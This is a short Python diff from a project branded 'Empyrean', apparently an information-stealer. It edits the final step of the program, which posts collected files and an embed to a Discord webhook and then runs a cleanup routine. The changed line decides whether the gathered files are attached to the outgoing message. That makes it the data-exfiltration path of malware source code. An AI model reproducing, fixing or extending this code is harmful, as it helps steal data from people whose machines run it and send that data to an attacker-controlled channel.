@@ -60,7 +60,7 @@ def main() -> None:
     embed.set_author(name="Empyrean", icon_url="https://i.imgur.com/ihzoAWl.jpeg")
     embed.set_footer(text="Empyrean ❤ Made by https://github.com/addi00000")
     
-    webhook.send(embed=embed, files=files if files != [] else None, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
+    webhook.send(embed=embed, files=files, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg") if files != [None, None, None, None, None] else webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
     
     cleanup()
     
